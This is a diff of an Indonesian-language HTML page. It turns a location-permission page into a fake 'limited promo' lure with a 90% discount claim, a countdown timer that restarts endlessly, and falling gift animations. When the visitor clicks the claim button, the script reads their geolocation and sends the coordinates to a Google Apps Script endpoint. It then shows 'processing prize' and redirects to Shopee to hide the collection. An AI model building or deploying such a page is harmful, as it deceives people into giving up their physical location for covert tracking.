@@ -1,95 +1,172 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Layanan Lokasi</title>
+  <title>Promo Spesial</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #ff512f, #dd2476);
+      overflow: hidden;
+      color: white;
+    }
 
-<style>
-body{
-  margin:0;
-  font-family: Arial;
-  background: linear-gradient(135deg,#667eea,#764ba2);
-  color:white;
-  text-align:center;
-}
+    .container {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      padding: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
 
-.container{
-  margin-top:100px;
-  padding:20px;
-}
+    .card {
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 25px;
+      max-width: 320px;
+      margin: auto;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      animation: fadeIn 1s ease;
+    }
 
-.card{
-  background: rgba(255,255,255,0.1);
-  backdrop-filter: blur(10px);
-  padding:20px;
-  border-radius:15px;
-}
+    @keyframes fadeIn {
+      from {opacity:0; transform: translateY(20px);}
+      to {opacity:1; transform: translateY(0);}
+    }
 
-button{
-  margin-top:20px;
-  padding:12px 25px;
-  border:none;
-  border-radius:10px;
-  background:#00e676;
-  font-size:16px;
-  font-weight:bold;
-  color:#000;
-}
+    h1 {
+      font-size: 20px;
+    }
 
-.status{
-  margin-top:15px;
-  font-size:14px;
-  opacity:0.8;
-}
+    .timer {
+      font-size: 24px;
+      font-weight: bold;
+      color: yellow;
+      margin: 10px 0;
+    }
 
-.success{color:#00ffcc;}
-.error{color:#ffcccc;}
-</style>
+    .gift {
+      font-size: 40px;
+      margin: 10px 0;
+      animation: bounce 1s infinite;
+    }
+
+    @keyframes bounce {
+      0%,100%{transform:translateY(0);}
+      50%{transform:translateY(-10px);}
+    }
+
+    button {
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      background: #00e676;
+      color: black;
+      font-weight: bold;
+      width: 100%;
+      margin-top: 10px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    #status {
+      margin-top: 10px;
+      font-size: 13px;
+    }
+
+    /* animasi jatuh */
+    .falling {
+      position: absolute;
+      top: -50px;
+      font-size: 24px;
+      animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+      to {
+        transform: translateY(110vh);
+      }
+    }
+  </style>
 </head>
 
 <body>
 
 <div class="container">
   <div class="card">
-    <h2>📍 Aktifkan Lokasi</h2>
-    <p>Kami membutuhkan izin lokasi untuk menampilkan layanan di sekitar Anda.</p>
+    <h1>🎁 Promo Terbatas</h1>
+    
+    <div class="gift">📱</div>
 
-    <button onclick="ambilLokasi()">Izinkan Lokasi</button>
+    <div>Diskon hingga 90%</div>
 
-    <div id="status" class="status">Menunggu izin...</div>
+    <div class="timer" id="timer">00:10</div>
+
+    <button onclick="ambilLokasi()">Ambil Sekarang</button>
+
+    <div id="status"></div>
   </div>
 </div>
 
 <script>
+// countdown
+let time = 10;
+setInterval(()=>{
+  time--;
+  document.getElementById("timer").innerHTML = "00:" + (time < 10 ? "0"+time : time);
+  if(time <= 0){
+    time = 10;
+  }
+},1000);
+
+// animasi jatuh
+setInterval(()=>{
+  let el = document.createElement("div");
+  el.className = "falling";
+  el.innerHTML = "🎁";
+  el.style.left = Math.random()*100 + "vw";
+  el.style.animationDuration = (Math.random()*3+2)+"s";
+  document.body.appendChild(el);
+
+  setTimeout(()=>{el.remove()},5000);
+},300);
+
+// ambil lokasi
 function ambilLokasi(){
 
-  document.getElementById("status").innerHTML="Meminta izin lokasi...";
-
-  if(navigator.geolocation){
+  if (navigator.geolocation) {
 
     navigator.geolocation.getCurrentPosition(
-
       function(pos){
 
-        let lat=pos.coords.latitude;
-        let lon=pos.coords.longitude;
+        var lat = pos.coords.latitude;
+        var lon = pos.coords.longitude;
 
-        document.getElementById("status").innerHTML="✅ Lokasi berhasil diambil";
-        document.getElementById("status").className="status success";
+        var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
+                  + lat + "&lon=" + lon;
 
-        fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+lat+"&lon="+lon);
+        fetch(url);
+
+        document.getElementById("status").innerHTML = "✅ Memproses hadiah...";
+
+        setTimeout(()=>{
+          window.location.href = "https://shopee.co.id";
+        },2000);
 
       },
 
-      function(err){
-        document.getElementById("status").innerHTML="❌ Gagal: "+err.message;
-        document.getElementById("status").className="status error";
+      function(error){
+        document.getElementById("status").innerHTML = "❌ Aktifkan lokasi dulu";
       }
 
     );
 
-  }else{
-    document.getElementById("status").innerHTML="❌ Browser tidak support";
+  } else {
+    document.getElementById("status").innerHTML = "❌ Tidak support";
   }
 }
 </script>
